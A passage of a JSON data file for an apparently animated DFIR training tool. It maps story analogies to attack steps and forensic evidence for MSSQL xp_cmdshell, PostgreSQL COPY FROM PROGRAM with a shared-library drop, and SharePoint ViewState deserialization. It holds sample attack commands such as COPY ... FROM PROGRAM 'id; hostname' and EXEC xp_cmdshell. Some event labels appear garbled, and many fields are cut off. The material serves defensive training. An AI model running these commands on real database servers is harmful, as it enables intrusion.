          "id": "net-mssql-xpcmd-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Shell command toolkit",
          "subtitle": "xplog70.dll module backing xp_cmdshell execution",
          "tone": "amber"
        },
        {
          "id": "net-mssql-xpcmd-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "External automation toolkit",
          "subtitle": "odsole70.dll module backing sp_OACreate execution",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Two Off",
          "stageTag": "STEP 02 · SETUP",
          "title": "Shell command toolkit",
          "storyExcerpt": "Moments later, the bookkeeper pulls two specialized hardware libraries off the shelf, one built for shell commands and another for external automation objects, and immediately spawns an office…",
          "technicalParallel": "Under the hood, the observed step executes Sysmon EventID 7: Image=sqlservr.exe ImageLoaded=...\\MSSQL\\Binn\\xplog70.dll (or odsole70.dll) (which executes a structured SQL query or database administration…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "External automation toolkit",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses external automation toolkit to advance toward bookkeeper parent process.",
          "technicalParallel": "When the attacker invokes EXEC master..xp_cmdshell (or sp_OACreate \"WScript.Shell\"), sqlservr.exe loads C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\xplog70.dll (or odsole70.dll…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Two Off",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Office command console",
          "storyExcerpt": "Behind the scenes, office command console captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording EventID=1 , Sysmon ProcessCreate + 7 , ImageLoaded xplog70.dll, ParentImage=sqlservr.exe, ChildImage=C:\\Windows\\System32\\cmd.exe, ServiceAccount=NT…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Vault Ledger",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Hidden Switch",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Trace",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.003"
    },
    "step-3": {
      "scenarioId": "dfir-mssql-xp-cmdshell-sp-oacreate-sqlservr-audit-trace",
      "sectionKey": "step-3",
      "sceneKind": "net-mssql-xpcmd-step-3",
      "stageBadge": "STEP #3 · PERSISTENCE",
      "title": "CLR Stored Procedure Persistence (sys.assemblies) & Default Trace (.trc) Forensics",
      "storyCue": "To maintain quiet access even if the workshop lever is locked again, the intruder registers an unsigned custom extension right inside the vault catalog while leaving a clear audit trail inside the automatic rolling trace reel.",
      "technicalCue": "T1505.001 · PERSISTENCE — Even if the attacker sets xp_cmdshell back to 0 (generating another EventID 15457 from 1 to 0) and registers a malicious .NET CLR assembly via CREATE ASSEMBLY ...",
      "storyMappings": [
        {
          "storyTerm": "Unsigned custom extension",
          "technicalTerm": "Malicious .NET CLR stored procedure in sys.assemblies",
          "tone": "amber"
        },
        {
          "storyTerm": "Vault catalog registry",
          "technicalTerm": "Database system catalog tables storing assemblies",
          "tone": "sky"
        },
        {
          "storyTerm": "Automatic rolling trace reel",
          "technicalTerm": "MSSQL Default Trace (.trc) forensic log files",
          "tone": "rose"
        },
        {
          "storyTerm": "Re-locked workshop lever",
          "technicalTerm": "Attacker disabling xp_cmdshell to hide initial traces",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-mssql-xpcmd-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Unsigned custom extension",
          "subtitle": "Malicious .NET CLR stored procedure in sys.assemblies",
          "tone": "amber"
        },
        {
          "id": "net-mssql-xpcmd-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Vault catalog registry",
          "subtitle": "Database system catalog tables storing assemblies",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Even If",
          "stageTag": "STEP 03 · SETUP",
          "title": "Unsigned custom extension",
          "storyExcerpt": "To maintain quiet access even if the workshop lever is locked again, the intruder registers an unsigned custom extension right inside the vault catalog while leaving a clear audit trail inside…",
          "technicalParallel": "Under the hood, the observed step executes T-SQL Forensics: SELECT name, permission_set_desc, create_date FROM sys.assemblies WHERE is_user_defined = 1; (which executes a structured SQL query or database…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Reel",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Vault catalog registry",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses vault catalog registry to advance toward automatic rolling trace reel.",
          "technicalParallel": "Even if the attacker sets xp_cmdshell back to 0 (generating another EventID 15457 from 1 to 0) and registers a malicious .NET CLR assembly via CREATE ASSEMBLY ...",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Reel",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Re-locked workshop lever",
          "storyExcerpt": "Behind the scenes, re-locked workshop lever captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in WinEvent Event 15457 (recording ForensicArtifact=SQL Server Default Trace , MSSQL\\Log\\log_*.trc & sys.assembly_files, PersistenceMechanism=User-Defined CLR Assembly , PERMISSION_SET =…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Vault Ledger",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Hidden Switch",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Trace",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.001"
    }
  },
  "dfir-postgresql-copy-from-program-pg-log-auditd-trace": {
    "briefing": {
      "scenarioId": "dfir-postgresql-copy-from-program-pg-log-auditd-trace",
      "sectionKey": "briefing",
      "sceneKind": "net-pg-copyprog-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1078",
      "title": "PostgreSQL COPY FROM PROGRAM & Large Object (pg_largeobject) Execution… — Story-to-Technical Overview",
      "storyCue": "An archive database manager normally imports and exports neat index tables, yet one special shipping privilege lets it feed a table straight from an external workshop tool. Investigators track a privileged sign-in using that import feature to run live floor commands and export a custom binary library right onto the archive disk.",
      "technicalCue": "INITIAL ACCESS: Privileged Role Authentication & pg_execute_server_program Check in postgresql.log -> EXECUTION: COPY ... FROM PROGRAM OS Command Execution & Linux auditd /bin/sh Child Trace -> PERSISTENCE: Large Object (pg_largeobject / lo_export) Shared Library Drop & Dynamic C Function Load",
      "storyMappings": [
        {
          "storyTerm": "Archive database manager",
          "technicalTerm": "PostgreSQL database server daemon (postgres)",
          "tone": "amber"
        },
        {
          "storyTerm": "Special shipping privilege",
          "technicalTerm": "Superuser or pg_execute_server_program role membership",
          "tone": "sky"
        },
        {
          "storyTerm": "External workshop import command",
          "technicalTerm": "SQL COPY ... FROM PROGRAM OS command execution",
          "tone": "rose"
        },
        {
          "storyTerm": "Exported custom binary library",
          "technicalTerm": "Shared object written via pg_largeobject and lo_export",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#10B981",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-pg-copyprog-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Archive database manager",
          "subtitle": "PostgreSQL database server daemon (postgres)",
          "tone": "amber"
        },
        {
          "id": "net-pg-copyprog-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Special shipping privilege",
          "subtitle": "Superuser or pg_execute_server_program role membership",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Open Spot",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Privileged Role Authentication & pg_execute_server_program Check in postgresql.log",
          "storyExcerpt": "Investigators open the archive reception register and spot a remote manager signing in with master clearance, then immediately querying the staff permission chart to confirm authority to run external…",
          "technicalParallel": "Under the hood, the observed step executes postgresql.conf: log_connections = on, log_disconnections = on, log_statement = 'ddl' (which executes the technical command / telemetry directive…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Slip",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "COPY ... FROM PROGRAM OS Command Execution & Linux auditd /bin/sh Child Trace",
          "storyExcerpt": "Next, the caller submits a table-import slip instructing the archive clerk to launch a command-line helper and pour its printed output straight into a temporary holding table, an action immediately…",
          "technicalParallel": "Under the hood, the observed step executes SQL Statement: CREATE TEMP TABLE cmd_out(t text); COPY cmd_out FROM PROGRAM 'id; hostname'; (which executes the PostgreSQL superuser SQL statement COPY…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Bulk-storage",
          "stageTag": "STAGE 03 · PERSISTENCE",
          "title": "Large Object (pg_largeobject / lo_export) Shared Library Drop & Dynamic C Function Load",
          "storyExcerpt": "For stealthier repeat execution, the caller stores binary library pieces inside the archive bulk-storage vault, writes them out as a fresh file on disk, and loads that custom tool directly inside the…",
          "technicalParallel": "Under the hood, the observed step executes SQL Forensics: SELECT loid, pageno, encode(data, 'hex') FROM pg_largeobject; (which executes a structured SQL query or database administration command , SQL…",
          "accentHex": "#10B981",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Archive Vault",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Import Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-postgresql-copy-from-program-pg-log-auditd-trace",
      "sectionKey": "step-1",
      "sceneKind": "net-pg-copyprog-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Privileged Role Authentication & pg_execute_server_program Check in postgresql.log",
      "storyCue": "Investigators open the archive reception register and spot a remote manager signing in with master clearance, then immediately querying the staff permission chart to confirm authority to run external workshop tools.",
      "technicalCue": "T1078 · INITIAL ACCESS — The actor authenticates to TCP 5432 as the postgres superuser (or a role granted pg_execute_server_program) due to a permissive trust/md5 entry in pg_hba.conf or leaked connection string.",
      "storyMappings": [
        {
          "storyTerm": "Archive reception register",
          "technicalTerm": "PostgreSQL server authentication and connection logs",
          "tone": "amber"
        },
        {
          "storyTerm": "Master clearance badge",
          "technicalTerm": "Superuser or pg_execute_server_program role",
          "tone": "sky"
        },
        {
          "storyTerm": "Staff permission chart",
          "technicalTerm": "pg_roles and pg_auth_members privilege check",
          "tone": "rose"
        },
        {
          "storyTerm": "Remote manager connection",
          "technicalTerm": "External client TCP session on port 5432",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-pg-copyprog-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Archive reception register",
          "subtitle": "PostgreSQL server authentication and connection logs",
          "tone": "amber"
        },
        {
          "id": "net-pg-copyprog-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Master clearance badge",
          "subtitle": "Superuser or pg_execute_server_program role",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Open Spot",
          "stageTag": "STEP 01 · SETUP",
          "title": "Archive reception register",
          "storyExcerpt": "Investigators open the archive reception register and spot a remote manager signing in with master clearance, then immediately querying the staff permission chart to confirm authority to run…",
          "technicalParallel": "Under the hood, the observed step executes postgresql.conf: log_connections = on, log_disconnections = on, log_statement = 'ddl' (which executes the technical command / telemetry directive…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Master clearance badge",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses master clearance badge to advance toward staff permission chart.",
          "technicalParallel": "The actor authenticates to TCP 5432 as the postgres superuser (or a role granted pg_execute_server_program) due to a permissive trust/md5 entry in pg_hba.conf or leaked connection string.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Open Spot",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Remote manager connection",
          "storyExcerpt": "Behind the scenes, remote manager connection captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Audit Event 5432 (recording LogFile=/var/lib/pgsql/16/data/log/postgresql-Mon.log, BackendPid=7412, DatabaseUser=postgres , Superuser / pg_execute_server_program, ClientIp=10.10.4.29…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Archive Vault",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Import Chute",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1078"
    },
    "step-2": {
      "scenarioId": "dfir-postgresql-copy-from-program-pg-log-auditd-trace",
      "sectionKey": "step-2",
      "sceneKind": "net-pg-copyprog-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "COPY ... FROM PROGRAM OS Command Execution & Linux auditd /bin/sh Child Trace",
      "storyCue": "Next, the caller submits a table-import slip instructing the archive clerk to launch a command-line helper and pour its printed output straight into a temporary holding table, an action immediately filmed by the building security camera.",
      "technicalCue": "T1059.004 · EXECUTION — The actor executes COPY cmd_exec FROM PROGRAM 'id; uname -a' (introduced in PostgreSQL 9.3, tracked under CVE-2019-9193 as a feature design risk).",
      "storyMappings": [
        {
          "storyTerm": "Table-import command slip",
          "technicalTerm": "COPY table FROM PROGRAM SQL statement",
          "tone": "amber"
        },
        {
          "storyTerm": "Launched command-line helper",
          "technicalTerm": "postgres worker spawning /bin/sh child process",
          "tone": "sky"
        },
        {
          "storyTerm": "Temporary holding table",
          "technicalTerm": "Scratch SQL table capturing command stdout",
          "tone": "rose"
        },
        {
          "storyTerm": "Building security camera",
          "technicalTerm": "Linux auditd execve process telemetry",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-pg-copyprog-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Table-import command slip",
          "subtitle": "COPY table FROM PROGRAM SQL statement",
          "tone": "amber"
        },
        {
          "id": "net-pg-copyprog-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Launched command-line helper",
          "subtitle": "postgres worker spawning /bin/sh child process",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Slip",
          "stageTag": "STEP 02 · SETUP",
          "title": "Table-import command slip",
          "storyExcerpt": "Next, the caller submits a table-import slip instructing the archive clerk to launch a command-line helper and pour its printed output straight into a temporary holding table, an action…",
          "technicalParallel": "Under the hood, the observed step executes SQL Statement: CREATE TEMP TABLE cmd_out(t text); COPY cmd_out FROM PROGRAM 'id; hostname'; (which executes the PostgreSQL superuser SQL statement COPY…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Launched command-line helper",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses launched command-line helper to advance toward temporary holding table.",
          "technicalParallel": "The actor executes COPY cmd_exec FROM PROGRAM 'id; uname -a' (introduced in PostgreSQL 9.3, tracked under CVE-2019-9193 as a feature design risk).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Next Slip",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Building security camera",
          "storyExcerpt": "Behind the scenes, building security camera captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Audit Event 59 (recording AuditSource=Linux auditd + PostgreSQL pgaudit Extension, ParentProcess=/usr/pgsql-16/bin/postgres , PID 7412, uid=26, SpawnedChild=/bin/sh -c id; hostname…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Archive Vault",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Import Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.004"
    },
    "step-3": {
      "scenarioId": "dfir-postgresql-copy-from-program-pg-log-auditd-trace",
      "sectionKey": "step-3",
      "sceneKind": "net-pg-copyprog-step-3",
      "stageBadge": "STEP #3 · PERSISTENCE",
      "title": "Large Object (pg_largeobject / lo_export) Shared Library Drop & Dynamic C Function Load",
      "storyCue": "For stealthier repeat execution, the caller stores binary library pieces inside the archive bulk-storage vault, writes them out as a fresh file on disk, and loads that custom tool directly inside the database worker.",
      "technicalCue": "T1505.001 · PERSISTENCE — Alternatively, if COPY FROM PROGRAM is monitored, an attacker chunks an ELF shared library (.so with PG_MODULE_MAGIC) into the pg_largeobject catalog table via lo_from_bytea / lo_put, exports…",
      "storyMappings": [
        {
          "storyTerm": "Bulk-storage vault",
          "technicalTerm": "PostgreSQL pg_largeobject binary storage table",
          "tone": "amber"
        },
        {
          "storyTerm": "Writing pieces onto disk",
          "technicalTerm": "lo_export() dropping a compiled shared library (.so)",
          "tone": "sky"
        },
        {
          "storyTerm": "Loading the custom tool",
          "technicalTerm": "CREATE FUNCTION loading dynamic C shared library",
          "tone": "rose"
        },
        {
          "storyTerm": "Forensic vault audit",
          "technicalTerm": "Querying pg_largeobject_metadata and pg_proc entries",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-pg-copyprog-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Bulk-storage vault",
          "subtitle": "PostgreSQL pg_largeobject binary storage table",
          "tone": "amber"
        },
        {
          "id": "net-pg-copyprog-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Writing pieces onto disk",
          "subtitle": "lo_export() dropping a compiled shared library (.so)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Bulk-storage",
          "stageTag": "STEP 03 · SETUP",
          "title": "Bulk-storage vault",
          "storyExcerpt": "For stealthier repeat execution, the caller stores binary library pieces inside the archive bulk-storage vault, writes them out as a fresh file on disk, and loads that custom tool directly…",
          "technicalParallel": "Under the hood, the observed step executes SQL Forensics: SELECT loid, pageno, encode(data, 'hex') FROM pg_largeobject; (which executes a structured SQL query or database administration command , SQL…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Onto Disk",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Writing pieces onto disk",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses writing pieces onto disk to advance toward loading the custom tool.",
          "technicalParallel": "Alternatively, if COPY FROM PROGRAM is monitored, an attacker chunks an ELF shared library (.so with PG_MODULE_MAGIC) into the pg_largeobject catalog table via lo_from_bytea / lo_put, exports it to…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tool",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Forensic vault audit",
          "storyExcerpt": "Behind the scenes, forensic vault audit captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Linux Audit Event 200 (recording CatalogTable=pg_proc , probin=\"/tmp/pg_ext.so\" & pg_largeobject , loid=16492, BinaryMagic=7F 45 4C 46 , ELF Shared Object with PG_MODULE_MAGIC…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Archive Vault",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Import Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.001"
    }
  },
  "dfir-sharepoint-iis-viewstate-losformatter-deserialization": {
    "briefing": {
      "scenarioId": "dfir-sharepoint-iis-viewstate-losformatter-deserialization",
      "sectionKey": "briefing",
      "sceneKind": "net-viewstate-deser-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "ASP.NET / SharePoint __VIEWSTATE MachineKey LosFormatter Deserialization… — Story-to-Technical Overview",
      "storyCue": "A web office sends visitors a folded state receipt stamped with a secret office seal so the clerk trusts any receipt brought back later. Once an outsider steals the secret sealing key from the office supply book, they forge a spring-loaded receipt that unpacks straight into a live command terminal under the clerk badge.",
      "technicalCue": "INITIAL ACCESS: web.config <machineKey> validationKey Exposure & ViewState Probing (Application EventID 1309) -> EXECUTION: Signed __VIEWSTATE LosFormatter / TypeConfuseDelegate Deserialization (IIS W3C Access Log) -> EXECUTION: w3wp.exe Child Process Creation & MachineKey Rotation Remediation (Sysmon EventID 1)",
      "storyMappings": [
        {
          "storyTerm": "Folded state receipt",
          "technicalTerm": "ASP.NET hidden __VIEWSTATE form parameter",
          "tone": "amber"
        },
        {
          "storyTerm": "Secret sealing key",
          "technicalTerm": "Exposed web.config <machineKey> validationKey",
          "tone": "sky"
        },
        {
          "storyTerm": "Spring-loaded forged receipt",
          "technicalTerm": "Signed LosFormatter / TypeConfuseDelegate gadget payload",
          "tone": "rose"
        },
        {
          "storyTerm": "Swapping the office seal",
          "technicalTerm": "MachineKey rotation and w3wp.exe process triage",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-viewstate-deser-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Folded state receipt",
          "subtitle": "ASP.NET hidden __VIEWSTATE form parameter",
          "tone": "amber"
        },
        {
          "id": "net-viewstate-deser-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Secret sealing key",
          "subtitle": "Exposed web.config <machineKey> validationKey",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. How Test",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "web.config <machineKey> validationKey Exposure & ViewState Probing (Application EventID 1309)",
          "storyExcerpt": "Investigators trace how an outsider obtained or guessed a publicly leaked office sealing stamp from the configuration binder and began sending small test receipts to verify that the front desk accepted…",
          "technicalParallel": "Under the hood, the observed step executes Application Log: Source=\"ASP.NET 4.0.30319.0\" EventID=1309 EventCode=4005 (Viewstate verification failed) (which executes the technical command / telemetry…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Seal Out",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "Signed __VIEWSTATE LosFormatter / TypeConfuseDelegate Deserialization (IIS W3C Access Log)",
          "storyExcerpt": "Once the seal checks out, the outsider submits a bulky, validly stamped receipt containing a chain of self-triggering parts. Trusting the valid wax seal, the office clerk unfolds the receipt and…",
          "technicalParallel": "Under the hood, the observed step executes IIS W3C Log Fields: date time c-ip cs-method cs-uri-stem cs-uri-query sc-status sc-bytes cs-bytes (which executes the technical command / telemetry directive…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Web Desk",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "w3wp.exe Child Process Creation & MachineKey Rotation Remediation (Sysmon EventID 1)",
          "storyExcerpt": "Endpoint sensors catch the web clerk suddenly launching system maintenance tools. Responders immediately revoke and replace the stolen sealing stamp across every branch desk so forged receipts stop…",
          "technicalParallel": "Under the hood, the observed step executes Sysmon EventID 1: ParentImage=C:\\Windows\\System32\\inetsrv\\w3wp.exe -> Image=C:\\Windows\\System32\\cmd.exe (which invokes or targets the host daemon/process…",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Sealing Stamp",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Spring Receipt",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Forensic Scan",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-sharepoint-iis-viewstate-losformatter-deserialization",
      "sectionKey": "step-1",
      "sceneKind": "net-viewstate-deser-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "web.config <machineKey> validationKey Exposure & ViewState Probing (Application EventID 1309)",
      "storyCue": "Investigators trace how an outsider obtained or guessed a publicly leaked office sealing stamp from the configuration binder and began sending small test receipts to verify that the front desk accepted the forged signature.",
      "technicalCue": "T1190 · INITIAL ACCESS — Before obtaining the valid key (or while probing with known pre-shared keys), failed __VIEWSTATE payloads trigger Windows Application EventID 1309 (Source: ASP.NET 4.0.30319.0, Event code: 4005…",
      "storyMappings": [
        {
          "storyTerm": "Configuration binder",
          "technicalTerm": "Application web.config containing <machineKey>",
          "tone": "amber"
        },
        {
          "storyTerm": "Leaked office sealing stamp",
          "technicalTerm": "Compromised or publicly known validationKey secret",
          "tone": "sky"
        },
        {
          "storyTerm": "Small test receipts",
          "technicalTerm": "Probing HTTP POST requests carrying signed __VIEWSTATE",
          "tone": "rose"
        },
        {
          "storyTerm": "Front desk arrival book",
          "technicalTerm": "IIS W3SVC access logs tracking POST lengths and status",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-viewstate-deser-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Configuration binder",
          "subtitle": "Application web.config containing <machineKey>",
          "tone": "amber"
        },
        {
          "id": "net-viewstate-deser-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Leaked office sealing stamp",
          "subtitle": "Compromised or publicly known validationKey secret",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. How Test",
          "stageTag": "STEP 01 · SETUP",
          "title": "Configuration binder",
